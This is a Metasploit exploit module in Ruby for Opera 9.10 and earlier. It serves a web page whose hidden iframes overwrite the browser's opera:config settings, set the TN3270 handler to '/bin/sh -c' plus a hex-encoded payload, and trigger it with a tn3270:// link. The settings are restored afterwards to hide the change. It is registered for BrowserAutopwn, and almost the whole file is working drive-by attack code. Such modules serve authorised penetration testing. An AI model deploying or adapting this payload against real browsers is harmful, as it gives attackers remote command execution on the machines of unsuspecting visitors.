##
# $Id: opera_configoverwrite.rb 7724 2009-12-06 05:50:37Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	#
	# This module acts as an HTTP server
	#
	include Msf::Exploit::Remote::HttpServer::HTML

	include Msf::Exploit::Remote::BrowserAutopwn
	autopwn_info({
		:ua_name => HttpClients::OPERA,
		:ua_ver => "1.0",
		:os_name => [ OperatingSystems::WINDOWS, OperatingSystems::LINUX ],
		:javascript => true,
		:rank => ExcellentRanking, # reliable exe writer
		:vuln_test => nil,
	})

	def initialize(info = {})
		super(update_info(info,{
			'Name'           => 'Opera 9 Configuration Overwrite',
			'Description'    => %q{
				Opera web browser in versions <= 9.10 allows unrestricted script
				access to its configuration page, opera:config, allowing an
				attacker to change settings and potentially execute arbitrary
				code.
			},
			'License'        => BSD_LICENSE,
			'Author'         =>
				[
					'egypt', # stolen from mpack
				],
			'Version'        => '$Revision: 7724 $',
			'References'     => [ ],
			'Payload'        =>
				{
					'ExitFunc' => 'process',
					'Space'    => 2048,
					'DisableNops' => true,
					'BadChars' => " ",
				},
			'Targets'        =>
				[
					#[ 'Opera < 9.10 Windows', 
					#	{
					#		'Platform' => 'win',
					#		'Arch' => ARCH_X86,
					#	}
					#],
					[ 'Opera < 9.10 Unix Cmd', 
						{
							'Platform' => 'unix',
							'Arch' => ARCH_CMD,
						}
					],
				],
			# Not sure when this was disclosed but it's been known since at
			# least March 5, 2007, since that's the release date on the version
			# of mpack I stole this from.
			'DisclosureDate' => 'Mar 5 2007',
			'DefaultTarget' => 0
			}))
	end

	def on_request_uri(cli, request)
		print_status("Got request #{request.uri}")

		case request.uri
		when get_resource
			print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")
			content =  "<body><script>"
			content << generate_evil_js(cli, request)
			content << "</script></body>"
			headers = { 'Content-Type' => 'text/html' }
		else
			print_status("404ing request for #{request.uri}")
			send_not_found(cli)
			return
		end
		send_response_html(cli, content, headers)

		print_status("Done with request #{request.uri}")
	end

	def generate_evil_js(cli, request)
		# There are a bunch of levels of quotes here, so the easiest way to
		# make everything line up is to hex escape the command to run
		p = regenerate_payload(cli).encoded
		$stdout.puts(p.class)
		print_status(p)
		send_not_found(cli) && return if not p
		
		shellcode = Rex::Text.to_hex(p, "%")
		js = <<ENDJS
blank_iframe = document.createElement('iframe');
blank_iframe.src = 'about:blank';
blank_iframe.setAttribute('id', 'blank_iframe_window');
blank_iframe.setAttribute('style', 'display:none');
document.body.appendChild(blank_iframe);
blank_iframe_window.eval(
	"config_iframe = document.createElement('iframe');" +
	"config_iframe.setAttribute('id', 'config_iframe_window');" +
	"config_iframe.src = 'opera:config';" +
	"document.body.appendChild(config_iframe);" +
	"cache_iframe = document.createElement('iframe');" +
	"cache_iframe.src = 'opera:cache';" +
	"cache_iframe.onload = function ()" +
	"{" +
	"	config_iframe_window.eval" +
	"	(\\"" +
	"	old_handler = opera.getPreference('Network','TN3270 App');" +
	"	old_pref    = opera.getPreference('User Prefs','Run TN3270 In Terminal');" +
	"	shellcode = '#{shellcode}';" +
	"	opera.setPreference('Network','TN3270 App','/bin/sh -c ' + unescape(shellcode));" +
	"	opera.setPreference('User Prefs','Run TN3270 In Terminal','0');" +
	"	app_link = document.createElement('a');" +
	"	app_link.setAttribute('href', 'tn3270://#{Rex::Text.rand_text_alpha(rand(5)+5)}');" +
	"	app_link.click();" +
	"	setTimeout(function () {opera.setPreference('Network','TN3270 App',old_handler)},1000);" +
	"	setTimeout(function () {opera.setPreference('User Prefs','Run TN3270 In Terminal',old_pref)},1000);" +
	"	\\");" +
	"};" +
	"document.body.appendChild(cache_iframe);" +
"");
ENDJS

	end

end

